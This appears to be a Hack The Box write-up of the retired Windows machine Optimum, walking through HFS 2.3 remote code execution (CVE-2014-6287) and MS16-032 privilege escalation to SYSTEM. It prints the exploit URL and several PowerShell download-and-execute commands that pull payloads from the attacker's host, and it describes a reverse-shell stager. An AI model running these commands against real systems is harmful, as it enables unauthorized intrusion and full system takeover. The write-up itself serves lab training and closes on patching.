---
layout: post
title: "Two Patches Late"
subtitle: "HTB Optimum, a Windows box that is one unpatched file server and one unpatched kernel, stacked exactly one click apart."
date: 2017-11-04 12:00:00 +0000
description: "A single open port, a file server that never got patched, and a kernel that never got patched either. Optimum is a lesson in how two missing Tuesdays become one full SYSTEM shell."
image: /assets/og/two-patches-late.png
tags: [hackthebox, writeup]
---

Optimum is the kind of box that makes you feel like you cheated, and you did not. There is exactly one open port. Behind it sits a small file server that someone downloaded years ago and never touched again, and that file server has a hole you can drive a shell through by typing a single weird URL into a browser. That gets you a user. Then the machine underneath that file server turns out to be just as stale as the program running on it, because the operating system itself is missing a patch from the same dry spell. So you climb the second missing patch the way you climbed the first. Two locks, both left open by the same kind of neglect, one click apart.

```
        O P T I M U M
        =============
        :80  HttpFileServer 2.3   the only door
              |
        ?search=%00{.exec| ... }  ))) "run this for me"
              |
              v
        shell as optimum\kostas   (a real user, no password ever typed)
              |
        kernel never patched either
              |
        MS16-032  ->  NT AUTHORITY\SYSTEM
                                            穴
```

## 0x01 · one port, one tell

The scan is almost rude in how little it gives you. One TCP port answers, and the service banner spells out the whole first act.

```
PORT   STATE SERVICE      VERSION
80/tcp open  http         HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
```

HttpFileServer, usually written HFS, is Rejetto's little single-binary web server for slinging files around a home network. Version 2.3 is the tell. That release froze in time years before this box went live, and a server that old is rarely the front door by accident. When the only port on a Windows host is a hobbyist file server wearing a version number from the bad old days, the box is not asking you to guess. It is handing you the exploit and waiting.

Picture a shop with one entrance, and bolted to that entrance is a brass plaque reading "model 2.3, installed long ago, never serviced." You have not picked a lock yet. You have just read the maintenance log off the wall.

## 0x02 · the search box that runs commands

HFS 2.3 carries CVE-2014-6287, and the bug is almost charming in how dumb it is. The server uses its own little macro language for templates, things wrapped in `{. .}` that the server expands when it builds a page. The search feature was supposed to keep user input far away from that macro engine. It does not. If you prefix your input with a null byte, written `%00` in a URL, a flaw in the server's regex parsing lets your text fall straight through into the macro engine, and one of the macros it happily understands is `exec`.

Think of it like a fast-food sign with snap-on plastic letters. The menu is supposed to be fixed and the customer is supposed to stay behind the counter. But there is a gap in the frame, and if you slide a letter in through the gap, the sign reads whatever you spelled, and the kitchen cooks it. The `%00` is you finding the gap. The `exec` macro is the kitchen reading your letters as an order.

You confirm it by making the box reach back and ping you, then you escalate to running a real command. The classic move is to have the box pull a PowerShell payload from a server you control.

```
# tiny http server to host the payload
python3 -m http.server 80

# the request, url-encoded, dropped in a browser or curl
http://10.10.10.8/?search=%00{.exec|powershell+IEX(New-Object+Net.WebClient).downloadString('http://10.10.14.4/iceberg.ps1').}
```

That `iceberg.ps1` is a one-line PowerShell stager whose only job is [reverse shell: a System.Net.Sockets.TcpClient back to 10.10.14.4 on a listening nc]. Set a listener, fire the URL, and the file server, running as the logged-in user, dials you back.

```
# nc -lvnp 443
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.8] 49217
PS C:\Users\kostas\Desktop> whoami
optimum\kostas
PS C:\Users\kostas\Desktop> type user.txt
████████████████████████████████
```

You are `kostas`, a real user on the box, and you never typed a password. The server typed it for you by trusting its own search box.

## 0x03 · the 32-bit trap

Now you want SYSTEM, and the honest path on Optimum is a kernel exploit. But before any of that works, the box sets a quiet little trap that eats hours if you do not see it.

The shell you caught is almost certainly a 32-bit process, because the payload ran through a 32-bit PowerShell. On 64-bit Windows there are two parallel worlds, and a 32-bit program that asks for `C:\Windows\System32` gets silently redirected to the 32-bit version instead. A kernel exploit is intimate with the actual 64-bit kernel. Hand it the 32-bit toolset and it misfires every time, and the failure looks like the exploit being broken rather than the shell being the wrong shape.

Think of it like a building with two staircases that look identical, one for staff and one for guests, and a sign-poster who automatically waves anyone in your uniform onto the guest stairs no matter where you said you were going. You keep ending up on the wrong floor and you cannot figure out why your key does not fit. The fix is to deliberately walk up the staff stairs. On Windows that staff staircase is a magic path called `sysnative`, which a 32-bit process can use to reach the genuine 64-bit `System32` and launch a true 64-bit PowerShell.

```
PS C:\> [Environment]::Is64BitProcess
False
PS C:\> C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -c "[Environment]::Is64BitProcess"
True
```

Re-stage your shell through that 64-bit PowerShell and now you are standing on the real floor, holding the real key.

## 0x04 · asking what never got patched

With a proper shell, you stop guessing and let a script read the patch history for you. The quick way is a PowerShell enumerator that knows the public privilege-escalation bugs and checks which patches are missing. Sherlock is the period-correct one, Watson is its tidier successor, and a full sweep like WinPEAS works too.

```
PS C:\Users\kostas> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/Sherlock.ps1')
PS C:\Users\kostas> Find-AllVulns
...
Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
VulnStatus : Appears Vulnerable
```

The scanner is not breaking anything. It is reading the list of installed updates and comparing it against a list of known holes, the way a mechanic runs your VIN against open recall notices. Optimum comes back flagged for a handful of 2016-era kernel bugs, and the dependable one is MS16-032.

## 0x05 · MS16-032, the badge swap

MS16-032 is CVE-2016-0099, a flaw in the Secondary Logon Service, the Windows component that runs a program as a different user. It mishandles its bookkeeping when it juggles process handles across threads. The exploit races that mishandling to grab a leftover handle to a privileged process and ride it up to SYSTEM.

Here is the plain version. The Secondary Logon Service is the building's security desk, the one place allowed to make new ID badges. The bug is that for a sliver of a second the desk leaves a freshly printed SYSTEM badge sitting unattended on the counter while it turns to do something else. The exploit is a person who has practiced grabbing that badge in exactly that sliver of a second, every single time, before the clerk turns back around.

The well-worn weaponization is the PowerShell `Invoke-MS16032`. Point its command at a fresh stager, and the new shell it spawns is no longer `kostas`.

```
PS C:\Users\kostas> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/Invoke-MS16032.ps1')
PS C:\Users\kostas> Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.4/iceberg.ps1')"
[+] Targeting 4 threads
[+] Holding handle...
[+] Done, spawning SYSTEM shell.
```

Catch it on a second listener.

```
PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

## 0x06 · the honest caveat

Optimum is rated Easy and it deserves the rating, but the reason it is easy is the part worth sitting with. Nothing here was clever. Nobody outsmarted a defender. Both halves of this box are the same failure wearing two outfits, and the failure is just time.

The file server hole and the kernel hole both had patches available before this machine ever booted. CVE-2014-6287 had a fix. MS16-032 had a fix. Someone stood up this host, never ran the file server's update, never let Windows take its monthly medicine, and walked away. The foothold and the root are not two skills. They are one habit of skipping Tuesdays, observed twice on the same machine.

That is the uncomfortable bit, because skipping Tuesdays does not feel like a security decision when you are doing it. It feels like being busy. It feels like "the box is fine, it has been fine for months." A missing patch is invisible right up until the afternoon someone reads your version banner and looks up the matching exploit, and from that afternoon on, your only port is also your only problem. You cannot enumerate your way out of a patch you never installed. The scanner that found MS16-032 for me is the same scanner a defender could have run on themselves, any quiet morning, for free.

## 0x07 · outro

```
one port answered, and it answered honestly:
"model 2.3, never serviced."

the file server typed the password for you.
the kernel left a badge on the counter.
both fixes shipped years before the box did.

read the version. take your tuesdays. wear black.

                                                            EOF
```

---

*HTB: Optimum, retired 28 Oct 2017. An easy Windows box that is really one sentence said twice: the patch existed, and nobody installed it.*